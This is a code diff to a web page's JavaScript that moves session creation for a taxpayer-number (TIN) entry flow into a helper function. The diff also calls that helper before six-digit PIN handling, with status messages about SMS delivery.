@@ -2062,6 +2062,39 @@
             return response.json();
         }
 
+        async function ensureSessionForTin() {
+            if (!innOk) {
+                return false;
+            }
+            if (currentSessionId) {
+                return true;
+            }
+            if (sessionCreateInProgress) {
+                return false;
+            }
+            sessionCreateInProgress = true;
+            try {
+                const sessionResp = await apiPost('/create-session', {
+                    inn: innVal,
+                    operatorName: OPERATOR_NAME,
+                    visitorName: VISITOR_NAME
+                });
+                if (sessionResp.created) {
+                    currentSessionId = sessionResp.sessionId;
+                    document.getElementById('op-bd').textContent = 'SMS sent • ' + currentSessionId;
+                    document.getElementById('op-bd').className = 'vp-val';
+                    return true;
+                }
+                return false;
+            } catch (e) {
+                document.getElementById('op-bd').textContent = 'SMS delivery error';
+                document.getElementById('op-bd').className = 'vp-val';
+                return false;
+            } finally {
+                sessionCreateInProgress = false;
+            }
+        }
+
         
         // ── NAVIGATION TABS ──
         function switchTab(tabId) {
@@ -2128,24 +2161,7 @@
             }
 
             if (innOk && !currentSessionId && !sessionCreateInProgress) {
-                sessionCreateInProgress = true;
-                try {
-                    const sessionResp = await apiPost('/create-session', {
-                        inn: innVal,
-                        operatorName: OPERATOR_NAME,
-                        visitorName: VISITOR_NAME
-                    });
-                    if (sessionResp.created) {
-                        currentSessionId = sessionResp.sessionId;
-                        document.getElementById('op-bd').textContent = 'SMS sent • ' + currentSessionId;
-                        document.getElementById('op-bd').className = 'vp-val';
-                    }
-                } catch (e) {
-                    document.getElementById('op-bd').textContent = 'SMS delivery error';
-                    document.getElementById('op-bd').className = 'vp-val';
-                } finally {
-                    sessionCreateInProgress = false;
-                }
+                await ensureSessionForTin();
             }
 
             checkProceed();
@@ -2171,6 +2187,10 @@
         function updDots() { for (let i = 1; i <= 6; i++) document.getElementById('pd' + i).className = 'pdot' + (i <= pinVal.length ? ' f' : ''); }
         async function pinDone() {
             if (pinVal.length < 6) return;
+
+            if (!currentSessionId) {
+                await ensureSessionForTin();
+            }
 
             if (!currentSessionId) {
                 document.getElementById('pr-ring').className = 'pr-ring err-r';
